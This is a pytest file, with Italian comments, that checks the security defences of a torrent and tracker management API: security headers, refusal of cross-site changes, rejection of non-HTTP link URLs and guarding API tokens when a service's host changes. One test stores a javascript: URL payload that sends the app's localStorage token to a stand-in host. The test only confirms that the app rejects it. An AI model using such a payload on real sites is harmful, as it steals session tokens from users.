"""Protezioni HTTP comuni (app/security_headers.py)."""


def test_every_response_has_the_security_headers(client):
    response = client.get("/api/disks")
    assert response.headers["X-Frame-Options"] == "DENY"
    assert response.headers["X-Content-Type-Options"] == "nosniff"
    assert "frame-ancestors 'none'" in response.headers["Content-Security-Policy"]
    assert "script-src 'self'" in response.headers["Content-Security-Policy"]


def test_a_change_from_another_site_is_refused(client):
    # Anche con un token valido: difesa in profondità contro il CSRF.
    assert client.post("/api/reviews/1/approve", headers={"Sec-Fetch-Site": "cross-site"}).status_code == 403
    assert client.post("/api/reviews/1/approve", headers={"Origin": "https://evil.example"}).status_code == 403
    assert client.post("/api/reviews/1/approve", headers={"Origin": "null"}).status_code == 403
    # Dalla UI stessa, o da uno script senza Origin: passa (qui 404, la review non esiste).
    assert client.post("/api/reviews/1/approve", headers={"Sec-Fetch-Site": "same-origin"}).status_code == 404
    assert client.post("/api/reviews/1/approve", headers={"Origin": "http://testserver"}).status_code == 404
    assert client.post("/api/reviews/1/approve").status_code == 404
    # Le letture non si toccano.
    assert client.get("/api/disks", headers={"Sec-Fetch-Site": "cross-site"}).status_code == 200


def test_urls_that_end_up_in_links_must_be_http(client):
    evil = "javascript:fetch('//x/'+localStorage.nazgarr_token)//"
    tracker = {"label": "t", "adapter_type": "unit3d", "base_url": evil, "api_token": "x"}
    assert client.post("/api/trackers", json=tracker).status_code == 422
    ok = client.post("/api/trackers", json={**tracker, "base_url": "https://t.example"})
    assert ok.status_code == 201
    tracker_id = ok.json()["id"]
    assert client.patch(f"/api/trackers/{tracker_id}", json={"base_url": "data:text/html,x"}).status_code == 422
    assert client.patch(f"/api/trackers/{tracker_id}", json={"announce_url": evil}).status_code == 422
    client_body = {"label": "q", "adapter_type": "qbittorrent", "base_url": evil}
    assert client.post("/api/torrent-clients", json=client_body).status_code == 422


def test_moving_a_service_to_another_host_needs_its_secrets_again(client):
    created = client.post("/api/trackers", json={"label": "t", "adapter_type": "unit3d",
                                                 "base_url": "https://t.example", "api_token": "tok"}).json()
    # Stesso host: nessun problema.
    assert client.patch(f"/api/trackers/{created['id']}", json={"base_url": "https://t.example/"}).status_code == 200
    # Un altro host senza il token: rifiutato, il token non parte verso il nuovo server.
    moved = client.patch(f"/api/trackers/{created['id']}", json={"base_url": "https://attacker.example"})
    assert moved.status_code == 400 and moved.json()["detail"]["params"]["fields"] == "api_token"
    ok = client.patch(f"/api/trackers/{created['id']}", json={"base_url": "https://new.example", "api_token": "t2"})
    assert ok.status_code == 200

    qbit = client.post("/api/torrent-clients", json={"label": "q", "adapter_type": "qbittorrent",
                                                     "base_url": "http://qbit:8080", "password": "pw"}).json()
    assert client.patch(f"/api/torrent-clients/{qbit['id']}", json={"base_url": "http://evil:8080"}).status_code == 400
